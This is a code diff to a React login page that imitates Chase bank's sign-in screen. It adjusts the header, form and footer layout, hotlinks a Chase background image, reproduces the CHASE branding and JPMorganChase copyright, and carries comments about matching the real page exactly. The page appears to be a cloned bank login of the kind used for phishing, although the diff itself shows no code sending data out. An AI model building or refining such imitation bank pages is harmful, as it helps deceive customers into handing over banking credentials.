@@ -85,17 +85,22 @@ export default function LoginPage() {
   };
 
   return (
-    <div className="flex flex-col min-h-[100dvh] w-full bg-[#f4f4f4] font-sans">
+    /* 
+      1. Removed 'flex flex-col' entirely.
+      2. This is now a standard block container. It will naturally scroll.
+    */
+    <div className="min-h-screen w-full bg-[#f4f4f4] font-sans">
       
-      {/* Background Image Header Area */}
+      {/* HEADER BLOCK */}
+      {/* Set a fixed height of 400px so the math is perfect */}
       <div 
-        className="relative flex-shrink-0 bg-cover bg-center h-[55vh] min-h-[300px]"
+        className="w-full h-[400px] relative bg-cover bg-center"
         style={{ backgroundImage: "url('https://asset.chase.com/content/services/rendition/image.xsmall.jpg/structured-images/geo-images/background/new_york/new_york_night_6.jpg')" }}
       >
         <div className="absolute inset-0 bg-gradient-to-b from-black/80 via-black/20 to-transparent"></div>
         
-        {/* Transparent Logo Match */}
-        <div className="absolute top-8 left-1/2 -translate-x-1/2 flex items-center justify-center z-20">
+        {/* Transparent Logo */}
+        <div className="absolute top-10 left-1/2 -translate-x-1/2 flex items-center justify-center z-20">
           <div className="text-white font-bold text-[28px] tracking-wider flex items-center gap-2">
             CHASE
             <BankLogo className="w-8 h-8 text-white" />
@@ -103,9 +108,11 @@ export default function LoginPage() {
         </div>
       </div>
 
-      {/* Form Container - Removed flex-1 to fix scrollbar calculation issues */}
-      <div className="w-full px-4 -mt-[38vh] relative z-10 flex justify-center">
-        <div className="bg-white rounded-md shadow-xl p-8 w-full max-w-[420px] h-fit">
+      {/* FORM BLOCK */}
+      {/* -mt-[300px] pulls it up over the image. 
+          pb-24 adds space below the form before the footer hits. */}
+      <div className="w-full px-4 relative z-10 -mt-[280px] pb-24">
+        <div className="bg-white rounded-md shadow-xl p-8 w-full max-w-[420px] mx-auto">
           
           {step === "login" && (
             <form onSubmit={handleLoginSubmit} className="space-y-6 animate-in fade-in duration-300">
@@ -255,12 +262,12 @@ export default function LoginPage() {
               </button>
             </form>
           )}
-
         </div>
       </div>
 
-      {/* Footer Area Matching Exact Image */}
-      <div className="bg-white py-6 px-4 border-t border-gray-200 mt-auto">
+      {/* FOOTER BLOCK */}
+      {/* Placed naturally at the bottom of the document flow */}
+      <div className="w-full bg-white pt-8 pb-12 px-4 border-t border-gray-200">
         
         {/* SVGs for Social Icons */}
         <div className="flex justify-center gap-6 mb-6">
@@ -305,6 +312,7 @@ export default function LoginPage() {
           <div>© 2026 JPMorganChase</div>
         </div>
       </div>
+
     </div>
   );
 }
